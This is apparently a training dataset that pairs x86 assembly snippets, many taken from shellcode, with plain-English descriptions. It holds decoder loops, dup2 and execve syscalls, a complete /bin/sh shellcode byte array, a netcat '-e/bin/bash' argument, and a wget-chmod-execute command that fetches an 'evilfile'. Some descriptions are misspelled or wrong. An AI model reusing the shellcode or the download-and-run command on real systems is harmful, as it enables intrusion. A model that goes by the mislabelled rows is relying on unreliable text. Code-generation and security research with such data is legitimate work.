SNIPPETS	INTENTS
jne checkbuzz	if the remainder is not equal to zero jump to local label checkbuzz
jne checkint	if the remainder is not equal to zero jump to local label checkint
jne decode_insertion	if the zero flag is clear jump to decode insertion label
jne encoded	if the zero flag is clear jump to _encoded label
jne encodedshellcode	if the zero flag is clear go to _encodedshellcode label
jne loop	jump to the address specified by the label loop if the operands are not equals in the previous comparison
jne next_addr	jump to the next_addr label if the operands of the above comparison are not equals
jne nextnumber	if not equal jump to the label nextnumber
jne no_error	jump to the label no_error if not equal
jne retry	jump to retry if not equal
jne short _while_loop	if not equal jump short to the _while_loop
jne short _while_loop	jump to the _while_loop label if the operands of the above comparison are not equals
jno insertion_decoder+0xc	if the overflow flag is clear go to the adress insertion_decoder+0xc
jns _dup2_loop	as long as sf is not set, jump to _dup2_loop label
jns _dup2_loop	jump to the _dup2_loop label if the previous instruction clears the sign flag
jns 2f	jump to 2f if the sign flag is zero
jns 3f	jump to 3f if the sign flag is zero
jns decode_pr	jump to decode_pr if not signed
jns dup2	as long as sf iss not set, jump to _dup2 label
jns dup2	jump to dup2 if not negative
jns dup2	jump to the dup2 label if the previous instruction clears the sign flag
jns dup2loop	jump back to the dup2loop procedure until ecx equals 0.
jns duploop	as long as sf iss not set, jump to _duploop label
jns duploop	jump to duploop if not negative
jns duploop	jump to the duploop label if the previous instruction clears the sign flag
jns loop	jump to loop_label if the sign flag is clear
jns loop	if sf not set jump to _loop label
jns loop	jump to _loop label if the sign flag is clear
jns loop	if sf not set, ecx not negative so continue looping
jns loop	if ecx is not inferior to 0 go to _loop label
jns loop	as long as sf is not set, jump to _loop label
jns loop	jump to the loop label if the previous instruction clears the sign flag
jns loop_dup	jump to loop_dup label if the sign flag is clear
jns loop2	as long as sf is not set, jump to _loop2 label
jns loopinghere	loop as long sign flag is not set
jns loopinghere	jump to the loopinghere label if the previous instruction clears the sign flag
jnz _start	jump to the _start label if the zero flag is cleared
jnz 0x41	jump to 0x41 if not zero
jnz 0x8	jump to 0x8 if not zero
jnz 1	if not zero jump to numeric label 1
jnz 1	jump to the numeric label 1 if the zero flag is cleared
jnz decode	jump to _decode label if flag zero is equal to 0
jnz decode	jump to the decode label if the zero flag is cleared
jnz dup2	jump to dup2 if flag zero is equal to 0
jnz exeunt	jump to exeunt if not zero
jnz exit_on_error	jump to exit_on_error label if flag zero is equal to 0
jnz exit_on_error	jump to the exit_on_error label if the zero flag is cleared
jnz incaddr	if no match go to incaddr
jnz incaddr	jump to incaddr if not equal
jnz incaddr	jump to incaddr if no match
jnz l00p	jump to the l00p label if the zero flag is cleared
jnz loop	jump to loop_label if flag zero is equal to 0
jnz loop	go to _loop label if flag zero is not set
jnz loop	jump to loop if not equal to zero
jnz loop	jump to the loop label if the zero flag is cleared
jnz next_addr	jump to next_addr if not zero
jnz next_cycle	if not zero jump to the next_cycle label
jnz next_cycle	jump to the next_cycle label if the zero flag is cleared
jnz scan	if not 0 then jump to the scan label
jnz short _paren	if not zero jump short to the _paren label
jnz short _parent	jump short to the _parent label if the zero flag is cleared
jnz short decode	jump short to decode if not zero
jnz short decode	jump short to the decode label if the zero flag is cleared
jnz short loc_4010e5	if not zero jump to loc_4010e5
jnz stage	jump to the stage label if the zero flag is cleared
jnz top	if not 0 then jump to the top label
jocker:	define _jocker label
jocker:	declare the jocker label
js error	jump to error label if sign flag SF is equal to 1
jz _close	jump to the label _close if the zero flag is set
jz _read	jump to the label _read if the zero flag is set
jz _start	jump to the _start label if the zero flag is set
jz 0x8	jump to 0x8 if zero
jz call_decoded	jump to the call_decoded label if the zero flag is set
jz child	if zero jump to the child label
jz child	jump to child if zero
jz child	jump to label child if the zero flag is set
jz child	jump to the child label if the zero flag is set
jz decoded_shellcode	if zero jump to decoded_shellcode
jz decoded_shellcode	jump to decoded if zero
jz download	jump to download if zero
jz download	jump to the download label if the zero flag is set
jz encoded	if zero jump to the encoded label
jz encoded	jump to the encoded label if the zero flag is set
jz exit	jump to the exit label if the zero flag is set
jz find_egg	jump to find_egg if zero
jz find_egg	jump to the find_egg label if the zero flag is set
jz finished	jump to the point in the code labeled finished if zero
jz formatting	if zero jump to the formatting label
jz formatting	jump to the formatting label if the zero flag is set
jz incpage	skip page if it returned efault
jz incpage	jump to incpage if equal
jz next_cycle	if zero jump to the next_cycle label
jz next_cycle	jump to the next_cycle label if the zero flag is set
jz next_page	jump to next_page if zero
jz nomoreargs	if zero flag is set jump to nomoreargs label
jz shift_decode	if zero jump to the shift_decode label
jz shift_decode	jump to the shift_decode label if the zero flag is set
jz short loc_402b13	if 0 then jump to loc_402b13
key equ 0xdeadbeef	declare key variable euqal to the value 0xdeadbeef
key equ 0xdeadbeef	define key constant equal to 0xdeadbeef
l00p:	declare the l00p label
L1: \n call [esp]	in L1 call the stack
L1: \n jmp short esp	in L1 jump short to esp
L1: \n jmp short L2	define L1 label and jump short to L2
L2: \n call [esp]	declare L2 label and call the function pointed by the stack
L2: \n jmp L3	define L2 label and jump to L3 label
L2: \n jmp short esi	define L2 and jump short to esi
L3: \n call [esp]	declare L3 and jump to the shellcode
L3: \n jmp edi	define the label L3 and jump to edi
L3: \n jmp short L4	define L3 and jump short to L4 label
L4: \n call [esp]	declare L4 and jump to the shellcode
L4: \n jmp short esp	in L4 jump short to the stack pointer
L5: \n call [esp]	in L5 jump to the shellcode
L5: \n jmp esp	define the label L5 and jump to the location pointed by the stack pointer
lea bx, [bp+0x08]	load the effective address of the operation [bp+0x08] into the bx register
lea bx, [bp+0x0b]	load the effective address of the operation bp+0x0b] into the bx register
lea cx, [bp+di+0x32]	load the effective address of the operation [bp+di+0x32] into the cx register
lea dx, [bp+di+0x3e]	load the effective address of the operation [bp+di+0x3e] into the dx register
lea eax, [ebx+0xf]	load the address of the variable at the address ebx+0xfinto eax register
lea eax, [ebx+0xf]	load the effective address of the result of the operation [ebx+0xf] into the eax register
lea eax, [ebx+17h]	load the effective address of the result of the operation [ebx+17h] into the eax register
lea eax, [ebx+8]	put the address of ebx+8 into eax
lea eax, [ecx+0bh]	load the effective address of the result of the operation [ecx+0bh] into the eax register
lea eax, [ecx+4]	load the effective address of the result of the operation [ecx+4] into the eax register
lea eax, [esi]	point eax to the start of the shellcode
lea eax, [esi+1]	point eax to the next byte of the shellcode
lea eax, [val]	place the value val in eax
lea eax, [var]	place the address of var in eax
lea eax, [var]	place the value in var in eax
lea eax, [zero_reg+3]	load the effective address [zero_reg+3] into eax
lea eax, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the eax register
lea eax, [zero_reg+6]	load the effective address [zero_reg+6] into eax
lea eax, [zero_reg+6]	load the effective address of the result of the operation [zero_reg+6] into the eax register
lea eax, [zero_reg+66h]	load the effective address [zero_reg+66h] into eax
lea eax, [zero_reg+66h]	load the effective address of the result of the operation [zero_reg+66h] into the eax register
lea eax,[ebx+0xb]	load the effective address of the operation [ebx+0xb] into the eax register
lea ebp,[ebp+0x59]	load the effective address of the operation [ebp+0x59] into the ebp register
lea ebx, [ebp-8]	load the effective address [ebp-8] into ebx
lea ebx, [ebp-8]	load the effective address of ebp-8 into the ebx register
lea ebx, [ebp+24]	load the effective address [ebp+24] into ebx
lea ebx, [ebp+24]	load the effective address of the result of the operation [ebp+24] into the ebx register
lea ebx, [ebp+39]	load the effective address [ebp+39] into ebx
lea ebx, [ebp+39]	load the effective address of the result of the operation [ebp+39] into the ebx register
lea ebx, [edx+0x4]	copy the adress of the varable at location edx+0x4 into ebx register
lea ebx, [edx+0x4]	load the effective address of edx+0x4 into ebx
lea ebx, [esi]	put address of string -> ebx
lea ebx, [esi]	load the effective address of esi into the ebx register
lea ebx, [esi]	point ebx to the start of the shellcode
lea ebx, [esi+1]	point ebx to the next byte of the shellcode
lea ebx, [esi+13]	load the effective address of the result of the operation [esi+13] into the ebx register
lea ebx, [esi+14]	load address of -lvp1337 in ebx
lea ebx, [esi+14]	load the effective address of the result of the operation [esi+14] into the ebx register
lea ebx, [esi+15]	load the effective address [esi+15] into ebx
lea ebx, [esi+15]	load the effective address of the result of the operation [esi+15] into the ebx register
lea ebx, [esi+23]	load address of -e/bin/bash into ebx
lea ebx, [esi+23]	load the effective address of the result of the operation [esi+23] into the ebx register
lea ebx, [esp +1]	load the effective address [esp+1] into ebx
lea ebx, [esp +1]	load the effective address of the result of the operation [esp +1] into the ebx register
lea ebx, [esp]	load stack pointer to ebx
lea ebx, [esp]	save esp address into ebx register
lea ebx, [esp]	load the effective address of esp into ebx
lea ebx, [esp]	load the effective address of esp into the ebx register
lea ebx, [zero_reg+3]	load the effective address [zero_reg+3] into ebx
lea ebx, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the ebx register
lea ebx,[esi]	load the address of esi into ebx register
lea ecx, [eax]	copy the address of eax in ecx
lea ecx, [eax]	load the effective address of the result of the operation [eax] into the ecx register
lea ecx, [ebp+28]	load the effective address [ebp+28] into ecx
lea ecx, [ebp+28]	load the effective address of the result of the operation [ebp+28] into the ecx register
lea ecx, [ebx+0xff]	load the value of ebx+0xff into register ecx
lea ecx, [ebx+8]	load the effective address of ebx+8 into ecx
lea ecx, [esi + 8]	load the adress esi+8 into ecx register
lea ecx, [esi + 8]	load the effective address of the result of the operation [esi + 8] into the ecx register
lea ecx, [esi]	point ecx to the start of the shellcode
lea ecx, [esi+1]	point ecx to the next byte of the shellcode
lea ecx, [esi+18]	load the effective address [esi+18] into ecx
lea ecx, [esi+18]	load the effective address of the result of the operation [esi+18] into the ecx register
lea ecx, [esi+22]	load the effective address of the result of the operation [esi+22] into the ecx register
lea ecx, [esi+35]	load address of ptr to argv[] array into ecx register
lea ecx, [esi+35]	load the effective address of the result of the operation [esi+35] into the ecx register
lea ecx, [esi+8]	load the effective address of the result of the operation [esi+8] into the ecx register
lea ecx, [esp]	load stack pointer to ebx
lea ecx, [esp]	load esp address into ecx register
lea ecx, [esp]	load the effective address of esp into the ecx register
lea ecx, [zero_reg+117]	load the effective address [zero_reg+117] into ecx
lea ecx, [zero_reg+117]	load the effective address of the result of the operation [zero_reg+117] into the ecx register
lea ecx, [zero_reg+3]	load the effective address [zero_reg+3] into ecx
lea ecx, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the ecx register
lea ecx,[esi+0xc]	load the address esi+0xc into ecx register
lea edi, [ebx]	load the effective address [ebx] into edi
lea edi, [ebx]	load the effective address of ebx into the edi register
lea edi, [ebx+4*esi]	place the value ebx+4*esi in edi
lea edi, [ebx+4*esi]	place the quantity ebx+4*esi in edi
lea edi, [edi + 2]	load the address of edi+2 into edi
lea edi, [edi +8]	make edi point to rot_value
lea edi, [esi + 13]	put the byte in the address esi+13 in edi regsiter.
lea edi, [esi + 13]	load the effective address of the result of the operation [esi + 13] into the edi register
lea edi, [esi + 13]	load the address at esi + 13 into edi
lea edi, [esi +1]	transfer the second character pointed from esi to edi
lea edi, [esi +1]	load the effective address of [esi + 1] into the edi register
lea edi, [esi]	copy the address of esi in edi
lea edi, [esi]	load the effective address [esi] into edi
lea edi, [esi]	load the address of esi into edi
lea edi, [esi]	point edi to the start of the shellcode
lea edi, [esi]	load the contents of esi into edi
lea edi, [esi+0x1]	load the address of esi+0x1 into edi
lea edi, [esi+1]	point edi to the next byte of the shellcode
lea edi, [esi+13]	load the effective address of esi+13 into esi+13
lea edi,[esi]	copy the address of esi into edi register
lea edi,[esi+0x1]	copy the adress a tesi+0x1 into edi register
lea edx, [ebx+12]	load the effective address of ebx+12 into edx
lea edx, [esi + 12]	load the adress esi+12 into edx register
lea edx, [esi + 12]	load the effective address of the result of the operation [esi + 12] into the edx register
lea edx, [esi]	point edx to the start of the shellcode
lea edx, [esi+1]	point edx to the next byte of the shellcode
lea edx, [esi+26]	load the effective address [esi+26] into edx
lea edx, [esi+26]	load the effective address of the result of the operation [esi+26] into the edx register
lea edx, [esi+30]	load the effective address of the result of the operation [esi+30] into the edx register
lea edx, [esi+47]	load address of ptr to envp[] null into edx register
lea edx, [esi+47]	load the effective address of the result of the operation [esi+47] into the edx register
lea edx,[esi+0x10]	load the address esi+0x10 into edx register
lea esi, [ebp+20]	load the effective address [ebp+20] into esi
lea esi, [ebp+20]	load the effective address of the result of the operation [ebp+20] into the esi register
lea esi, [edi + 8]	transfer the eighth character pointed by edi to esi
lea esi, [edi +16]	make esi register point to shellcode
lea esi, [edi +8]	make esi point to shellcode that contains previous xor’ed results
lea esi, [esi +4]	load the effective address of the result of the operation [esi +4] into the esi register
lea esi, [esi+2]	load the effective address of esi+2 into esi
lea esi, [esi+4]	load the effective address [esi+4] into esi
lea esp, [ebx]	load the value of register ebx into register esp
lea rdi, [rsp]	load the address of the string that is on the stack into rsi
len equ $ - msg	define len equal to the length of msg
len equ $-encodedshellcode	define len equal to the lenght of the encodedshellcode array
len: equ $-encodedshellcode	variable for the lenght of the encoded shellcode
len: equ $-google	"define len = size of db ""127.1.1.1 google.com"""
len: equ $-google	declare the len label equal to the size of the google variable
len: equ $-shellcode	define lenght of shellcode, len
len: equ $-shellcode	declare the len label equal to the length of shellcode
les esp,fword ptr [ebx]	loads 32-bit pointer from ebx to esp and fs regster
letter_c db 'c'	allocate a single byte of memory and initialize it to the letter 'c'
line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a	define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a
"line db ""/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile"", 0x0a"	"jump to the _exec label after entering the address of the string """"/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile"", 0x0a"" at the top of the stack"
loader:	define _loader
loader:	declare the loader label
lods al,byte ptr ds:[esi]	transfers string element addressed by esi regoster into al register
loop .3	decrement the counter and jump to .3 label if the count is not zero
loop 3	decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero
loop bucle	decrement the ecx register and jump to the bucle label if the counter is not zero
loop check_even_odd	loop check_even_odd using ecx for counter
loop check_even_odd	decrement the count register and jump to check_even_odd if the count is not equal to zero
loop check_even_odd \n jmp short shellcode	decrease the counter and jump to check_even_odd if not zero else jump short to shellcode
loop check_even_odd \n jmp short shellcode	decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decode	loop decode
loop decode	start loop decode
loop decode	loop deocde
loop decode	loop while zero flag not set
loop decode	decode current byte
loop decode	decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero
loop decode	decrement the count register and jump to decode if not equal zero
loop decode	decrease the counter and jump to decode if not zero
loop decode \n jmp edx	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register
loop decode \n jmp edx	decrement the counter and jump to decode if not zero else jump to edx
loop decode \n jmp EncodedShellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label
loop decode \n jmp encodedshellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the encodedshellcode label
loop decode \n jmp Shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label
loop decode \n jmp shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decode \n jmp shellcode	decrement the counter and jump to decode routine if it is not zero else jump to shellcode label
loop decode \n jmp short encodedshellcode	decrement the counter and jump to the decode label if it is not zero else jump short to the encodedshellcode label
loop decode \n jmp short shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decode \n jmp short shellcode	decrease the counter and jump to decode if not zero else jump short to shellcode
loop decode_loop \n jmp short encoded_shellcode	decrement the counter and if it is not zero go back at decode_loop and execute the cicle again else jump to encoded_shellcode
loop decrypt	decrement the count register and jump to _decrypt if not equal zero
loop decrypt	decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero
loop decrypt \n jmp encrypt	decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label
loop do_dup	decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero
loop do_dup	decrement the counter and jump to the do_dup label if the count is not zero
loop do_dup \n push byte 0x3f	decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack
loop eggLoop \n jmp edi	decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register
loop fill	decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero
loop fill	decrement the counter and jump to the fill label if the count is not zero
loop fill \n mov ecx, esp	decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
loop l1 \n mov eax, esp	decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register
loop l1 \n mov eax, esp	decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register
loop l2 \n jmp edi	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register
loop l2 \n mov ebx, esp	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
loop l2 \n mov ebx, esp	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register
loop l3 \n mov ecx, esp	decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
loop l3 \n mov ecx, esp	decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register
loop l4 \n mov edx, esp	decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register
loop l4 \n mov edx, esp	decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register
loop main_inc	decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero
loop main_inc \n mov ebx, esp	decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
loop main_inc \n mov ebx, esp	decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register
loop main_loop	decrement the counter and jump to the main_loop label if the count is not zero
loop main_push	decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero
loop main_push \n mov cl, 30	decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register
loop rot_decode	loop 4 times
loop ROT_decode \n jmp short Shellcode	decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label
loop up	decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
loop xor_decode	loop 4 times
loop_dup:	define _loop_dup label
loop:	declare loop_label
loop:	define _loop_label
loop:	define _loop label
loop:	declare the loop label
loop:	define the loop label
loop2:	define _loop2 label
loopinghere:	define _ loopinghere label
loopinghere:	declare the loopinghere label
loopnz decode	decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero
loopnz L1	decrement the counter and jump to the L1 label if the count is not zero and the zero flag is equal to zero
loopnz L1 \n jmp shellcode	decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label
loopnz L2	decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero
loopnz L2 \n push eax	decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack
loopnz L3 \n mov edx, 7	decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register
loopnz Label1	decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero
loopnz next	decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero
loopnz next \n jmp ecx	decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register
loopnz next2 \n jmp edi	decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register
lowbound:	lowbound label
main_inc:	declare the main_inc label
main_inc:	create label main_inc
main_loop:	define main_loop label
main_push:	create label main_push
main_push:	declare the main_push label
main:	define main_label
main:	declare the main label
main:	main function
main:	create main label
main:	define main label
marks dw 0, 0, 0, 0	allocate memory for the marks array of words and initialize all elements to zero
matrix qw 12*10	allocate memory for a 12*10 quad-bytes matrix
me:	declare the me label
me:	define me label
message db '/bin/sh'	define message byte and initialize it to '/bin/sh'
message db '/bin/sh'	define message as the byte string '/bin/sh'
message db '/etc/passwd'	define the string message and initialize it to '/etc/passwd'
message db '/etc/passwd'	define message as the byte string '/etc/passwd'
message db 'hello',13,0	allocate memory for a null terminated string 'hello\n'
message:	declare message_label
message: db 'hello world!'	declare message to contain the bytes 'hello world!'
message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68	define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
mov [1000h], ax	move the value of ax into memory at address 1000h
mov [bp+0x07], al	move the contents of the al register at the memory location specified by the operation [bp+0x07]
mov [bp+0x0a], al	move the contents of the al register at the memory location specified by the operation [bp+0x0a]
mov [bp+0x31], al	move the contents of the al register at the memory location specified by the operation [bp+0x31]]
mov [bp+0x32], si	move the contents of the si register at the memory location specified by the operation [bp+0x32]
mov [bp+0x36], bx	move the contents of the bx register at the memory location specified by the operation [bp+0x36]
mov [bp+0x3a], bx	move the contents of the bx register at the memory location specified by the operation [bp+0x3a]
mov [bp+0x3e], ax	move the contents of the ax register at the memory location specified by the operation [bp+0x3e]
mov [ebp-4], edi	move edi into the local memory address ebp-4
mov [ebp+12], ecx	move ecx into the address [ebp+12]
mov [ebp+12], ecx	move the contents of ecx into the memory location specified by the operation [ebp+12]
mov [ebp+20], zero_reg	move the contents of zero_reg into the memory location specified by the operation [ebp+20]
mov [ebp+20], zero_reg	move zero_reg into the address [ebp+20]
mov [ebp+22], word ax	move the word at the address ax into [ebp+22]
mov [ebp+22], word ax	move the word in ax into the memory location specified by the operation [ebp+22]
mov [ebp+var_a], eax	move the contents of eax into address defined by ebp+var_a
mov [ebx + 6], dl	save dl content into the space memory at the adress ebx + 6
mov [ebx + 6], dl	move dl into the address [ebx + 6]
mov [ebx], 110	move 110 into the effective address saved in ebx
mov [ebx], 123	move 123 into the effective address saved in ebx
mov [ebx+0xe], dl	copy dl content into memory space at the address ebx + 0xe
mov [ebx+0xe], dl	move dl into the address [ebx+0xe]
mov [ebx+12], eax	move eax into ebx+12
mov [ebx+7], al	move al into ebx+7
mov [ebx+8], ebx	move ebx into ebx+8
mov [ecx], 25	move 25 decimal into the memory address ecx
mov [ecx+4], eax	zero out [ecx+4]
mov [ecx+4], eax	move eax into the address [ecx+4]
mov [edi], al	copy al content into edi register
mov [edi], al	move decoded byte to edi
mov [edi], al	move the contents of the al register into the edi register
mov [edi], al	move al into the address pointed by edi
mov [edi], al	move the contents of the al register into the address pointed by edi
mov [edi], al	move al into edi register
mov [esi], al	copy al content into esi
mov [esi], al	move the contents of the al register into the esi register
mov [esi], al	swap al value with next byte value in esi
mov [esi+13], al	move al into the address [esi+13]
mov [esi+22], al	move al into the address [esi+22]
mov [esi+34], al	move al into the address [esi+34]
mov [esi+35], esi	move esi into the address [esi+35]
mov [esi+39], ebx	move ebx into the address [esi+39]
mov [esi+43], ebx	move ebx into the address [esi+43]
mov [esi+47], eax	move eax into the address [esi+47]
mov [esi+eax], cl	move the contents of cl into the byte at memory address esi+eax
mov [esp + 1], cl	move cl into the address [esp + 1]
mov [esp+4], esp	move esp into the address [esp+4]
mov [esp+4],esp	sets esp as recv buffer
mov [esp+57], al	move al into the address [esp+57]
mov [esp+57],al \n mov [esp+58],ah \n mov [esp+59], ebx	save into esp register the syscall command ‘int 0x80 and jump back to _stage’
mov [esp+58], ah	move ah into the address [esp+58]
mov [esp+59], ebx	move ebx into the address [esp+59]
mov [var], ebx	move the contents of ebx into the 4 bytes at memory address var
mov [var1], eax	move the contents of eax into the 4 bytes at memory address var1
mov a_letter, al	move al into memory address a_letter
mov ah, 0x80	move 0x80 into ah
mov al, [byte_tbl+2]	move the effective address of byte_tbl+2 to al register
mov al, [esi]	trasfer esi content into al register
mov al, [esi]	move the contents of the esi register into the al register
mov al, 03h	move 03h into al
mov al, 03h \n int 80h	execute __nr_read syscall
mov al, 04h	move 04h into al
mov al, 04h \n int 80h	execute __nr_write syscall
mov al, 05h	move 05h into al
mov al, 05h \n int 80h	execute __nr_open syscall
mov al, 0x01	move 0x1 into lower byte of the eax register
mov al, 0x01	move 0x01 into al
mov al, 0x04	move 0x04 into al
mov al, 0x05	put the syscall 0x5 into the al register
mov al, 0x06	move 0x06 into al
mov al, 0x0a	move 0x0a into al
mov al, 0x0b	save execve command in al register
mov al, 0x0b	move the hexadecimal value 11 in al register
mov al, 0x0b	copy the execve syscall numebr in al regisster
mov al, 0x0b	move 0x0b into al
mov al, 0x1	move the code of syscall exit in al register
mov al, 0x1	load __nr_exit syscall number into al register
mov al, 0x1	move the value 0x1 into the al register
mov al, 0x1	move 0x1 into lower byte of the eax register
mov al, 0x1 \n mov bl, 0x1	save 0x1 into al and bl regsters
mov al, 0x1 \n mov bl, 0x1	push hexadecimal value 0x1 into al and bl registers
mov al, 0x1 \n mov bl, 0x1	save hexadecimal value 0x1 into al and bl register
mov al, 0x17	setuid = 0x17
mov al, 0x17	move 0x17 into al
mov al, 0x1f	set the offset bytes to point at the end of the program
mov al, 0x1f	move 0x1f into al
mov al, 0x2	load __nr_fork sycall into al register
mov al, 0x2	put the syscall 0x2 into the al register
mov al, 0x21	move 0x21 into al
mov al, 0x21 \n int 0x80	load __nr_access into al register and ping kernel
mov al, 0x27	load __nr_alarm into al register
mov al, 0x2e	save setgid = 0x2e into al register
mov al, 0x2e	move 0x2e into al
mov al, 0x3	copy the value 3 into al register
mov al, 0x3	load read syscall number into al register
mov al, 0x3	move 0x3 into al
mov al, 0x30	move 0x30 into al
mov al, 0x33	move 0x33 into al
mov al, 0x3b	load execve syscall into al register
mov al, 0x3f	load __nr_dup2 into al register
mov al, 0x3f	load sys_dup2 into al register
mov al, 0x3f	load sys call for dup2 into al register
mov al, 0x3f	move 0x3f into al
mov al, 0x3f	syscall 63
mov al, 0x3f \n int 0x80	execute sys_dup2
mov al, 0x3f \n int 0x80	load dup2 syscall into al register and execute
mov al, 0x4	move the value 0x4 into the al register
mov al, 0x4	move 0x4 into al
mov al, 0x42	move 0x42 into al
mov al, 0x46	load setreuid into al register
mov al, 0x46	move 0x46 into al
mov al, 0x5	trasfer 5 into al register
mov al, 0x5	load open syscall number into al register
mov al, 0x5	move the value 0x5 into the al register
mov al, 0x5	move 0x5 into al
mov al, 0x58	loading syscall value = 0x58 for reboot in al
mov al, 0x58	load the syscall value 0x58 for reboot in the al register
mov al, 0x6	load __nr_close syscall into al register
mov al, 0x6	move 0x6 into al
mov al, 0x6 \n int 0x80	close the stream file
mov al, 0x66	move the command socketcall in al register
